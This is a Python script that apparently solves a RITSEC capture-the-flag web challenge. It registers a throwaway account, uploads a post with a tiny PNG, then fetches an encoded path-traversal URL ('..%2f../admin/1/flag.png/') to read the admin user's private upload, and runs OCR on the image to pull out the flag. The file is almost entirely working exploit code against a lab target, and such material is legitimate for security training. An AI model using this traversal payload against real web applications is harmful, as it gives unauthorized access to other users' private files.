#!/usr/bin/env python3
import json
import random
import re
import string
import subprocess
import sys
from pathlib import Path

import requests

BASE = "https://poastboard-a0c21794-6cbf-4793-885a-2fc30106d639.ctf.ritsec.club"
OUT = Path("flag1.png")

TINY_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO5Zz1kAAAAASUVORK5CYII="
)


def rand_user(prefix: str = "atk") -> str:
    tail = "".join(random.choices(string.digits, k=10))
    return f"{prefix}{tail}"


def must_json(resp: requests.Response) -> dict:
    try:
        return resp.json()
    except Exception:
        print("[!] response is not JSON:")
        print(resp.text[:500])
        raise


def try_tesseract(png_path: Path) -> str | None:
    try:
        out = subprocess.check_output(
            ["tesseract", str(png_path), "stdout"],
            stderr=subprocess.DEVNULL,
            text=True,
        )
    except Exception:
        return None

    m = re.search(r"RS\{[^\n\r}]*\}", out)
    return m.group(0) if m else None


def main() -> int:
    s = requests.Session()

    username = rand_user()
    password = "pass12345"

    r = s.post(f"{BASE}/api/register", data={"username": username, "password": password}, allow_redirects=False, timeout=20)
    if r.status_code != 302:
        print(f"[!] register failed: {r.status_code}")
        print(r.text[:500])
        return 1

    post_data = {
        "content": "x",
        "image": f"data:image/png;base64,{TINY_PNG_B64}",
        "is_private": False,
    }
    r = s.post(f"{BASE}/api/post", data=json.dumps(post_data), headers={"Content-Type": "application/json"}, timeout=20)
    j = must_json(r)
    if "id" not in j:
        print(f"[!] create post failed: {j}")
        return 1
    own_id = j["id"]

    vuln_path = f"/uploads/{username}/{own_id}/..%2f../admin/1/flag.png/"
    url = f"{BASE}{vuln_path}"

    r = s.get(url, timeout=20)
    if r.status_code != 200 or not r.content.startswith(b"\x89PNG"):
        print(f"[!] exploit failed: status={r.status_code}, len={len(r.content)}")
        print(r.text[:300])
        return 1

    OUT.write_bytes(r.content)
    print(f"[+] saved: {OUT.resolve()}")

    flag = try_tesseract(OUT)
    if flag:
        print(f"[+] flag: {flag}")
    else:
        print("[i] tesseract not available or OCR failed. Open flag1.png manually.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
